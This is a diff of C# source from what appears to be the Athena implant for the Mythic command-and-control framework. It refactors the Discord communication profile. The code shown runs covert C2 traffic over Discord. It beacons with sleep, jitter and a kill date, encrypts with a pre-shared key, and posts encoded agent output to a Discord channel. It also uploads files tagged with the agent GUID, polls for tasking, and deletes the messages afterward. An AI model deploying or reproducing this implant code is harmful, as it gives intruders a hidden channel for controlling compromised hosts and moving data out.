@@ -12,18 +12,19 @@ using System.Net.Http;
 using System.Text;
 using System.Net.Http.Headers;
 using System.IO;
+using Athena.Models.Config;
 
-namespace Athena
+namespace Profiles
 {
-    public class MythicConfig
+    public class Config : IConfig
     {
-        public Discord currentConfig { get; set; }
+        public IProfile currentConfig { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder { get; set; }
-        public MythicConfig()
+        //public Forwarder forwarder { get; set; }
+        public Config()
         {
             uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
@@ -33,10 +34,10 @@ namespace Athena
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Discord();
-            this.forwarder = new Forwarder();
+            //this.forwarder = new Forwarder();
         }
     }
-    public class Discord
+    public class Discord : IProfile
     {
         public bool encrypted { get; set; }
         public string messageToken { get; set; }
@@ -69,7 +70,7 @@ namespace Athena
 
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
+                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -117,7 +118,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Config.uuid + json);
                 }
 
                 MythicMessageWrapper msg = new MythicMessageWrapper()
@@ -179,13 +180,13 @@ namespace Athena
                         }
                     }
                     checkins++;
-                    if(checkins == this.messageChecks)
+                    if (checkins == this.messageChecks)
                     {
                         return "";
                     }
 
                 } while (agentMessages.Count() < 1);
-                    
+
                 //No concept of chunking yet, so just grab one
                 json = agentMessages.FirstOrDefault().message;
                 DeleteMessages(msgToRemove);
@@ -217,12 +218,12 @@ namespace Athena
         public async Task<bool> SendMessage(string msg)
         {
             string url = "https://discord.com/api/channels/" + this.ChannelID + "/messages";
-            
-            Dictionary<string,string> Payload = new Dictionary<string, string>()
+
+            Dictionary<string, string> Payload = new Dictionary<string, string>()
             {
               {"content" , msg }
             };
-            
+
             StringContent content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
             HttpResponseMessage res = await discordClient.PostAsync(url, content);
 
@@ -284,7 +285,7 @@ namespace Athena
                     File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                     File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                     {
-                        FileName =  agent_guid + ".server",
+                        FileName = agent_guid + ".server",
                     };
                     Content.Add(File_Content);
                     var res = await discordClient.PostAsync(URL, Content);
@@ -315,7 +316,7 @@ namespace Athena
                 {
                     message = await content.ReadAsStringAsync();
                 }
-                
+
                 if (response.IsSuccessStatusCode)
                 {
                     return await Unescape(message);
@@ -326,7 +327,7 @@ namespace Athena
 
         private async Task<string> Unescape(string message)
         {
-            return message.TrimStart('"').TrimEnd('"').Replace("\\\"","\"");
+            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
 
         }
         public async Task<bool> DeleteMessages(List<string> messages) //server and guild are the same lol
@@ -338,7 +339,7 @@ namespace Athena
                 var res = await discordClient.DeleteAsync(url);
                 success = res.IsSuccessStatusCode;
             }
-            
+
             return success;
         }
         public class MythicMessageWrapper
@@ -423,7 +424,7 @@ namespace Athena
         {
             public string id { get; set; }
             public string filename { get; set; }
-            public string? description {get; set;}
+            public string? description { get; set; }
             public string? content_type { get; set; }
             public int size { get; set; }
             public string url { get; set; }
